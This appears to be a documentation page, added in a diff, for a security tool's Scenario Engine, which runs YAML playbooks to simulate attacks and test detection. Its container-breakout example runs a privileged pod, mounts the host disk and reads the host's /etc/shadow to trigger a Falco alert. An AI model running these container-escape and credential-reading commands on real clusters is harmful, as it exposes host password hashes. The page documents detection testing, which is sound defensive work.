@@ -1,0 +1,58 @@
+export const metadata = {
+  title: "Scenario Engine | Vigilante Docs",
+  description: "Learn how to use the Vigilante Scenario Engine to simulate and test security responses.",
+};
+
+# Scenario Engine
+
+The Scenario Engine in Vigilante allows you to execute security playbooks using YAML files. This allows for automated deployment of vulnerable assets, simulating exploits, and testing detection and response capabilities (e.g., Falco, SOAR actions).
+
+## Running a Scenario
+
+You can run any bundled scenario or custom scenario using the CLI:
+
+```bash
+# List available scenarios
+vigilante scenario list
+
+# Run a specific scenario
+vigilante scenario run container-breakout
+```
+
+## Scenario Definitions
+
+Scenarios are defined in YAML. By default, Vigilante looks for them in `~/.config/vigilante/scenarios/` and in its built-in bundled directory.
+
+### Example: Container Breakout
+
+The built-in `container-breakout` scenario runs the following steps:
+
+1. Deploys a privileged Ubuntu pod
+2. Waits 5 seconds for initialization
+3. Mounts the host's `/dev/sda1` filesystem directly into the container (`/hostos`)
+4. Reads the `/etc/shadow` file from the host filesystem to trigger a Falco alert
+
+```yaml
+name: "Container Breakout"
+description: "Deploys a vulnerable pod and simulates a container breakout to the host filesystem."
+steps:
+  - name: "Deploy Vulnerable Pod"
+    type: "kubectl"
+    command: "run vulnerable-pod --image=ubuntu --privileged --restart=Never -- sleep 3600"
+  - name: "Wait for Pod to start"
+    type: "delay"
+    seconds: 5
+  - name: "Simulate Breakout (Mount hostfs)"
+    type: "kubectl"
+    command: "exec vulnerable-pod -- sh -c 'mkdir -p /hostos && mount /dev/sda1 /hostos || true'"
+  - name: "Trigger Falco Detection"
+    type: "kubectl"
+    command: "exec vulnerable-pod -- sh -c 'cat /hostos/etc/shadow || echo \"root:$6$vulnerable:1:0:99999:7:::\" > /tmp/shadow'"
+```
+
+## Creating Custom Scenarios
+
+Create a YAML file inside `~/.config/vigilante/scenarios/my-scenario.yaml` with your custom steps. The scenario engine supports the following step types:
+- `kubectl`: Runs a `kubectl` command inside the cluster.
+- `helm`: Runs a `helm` command.
+- `delay`: Pauses execution for a specified number of seconds.
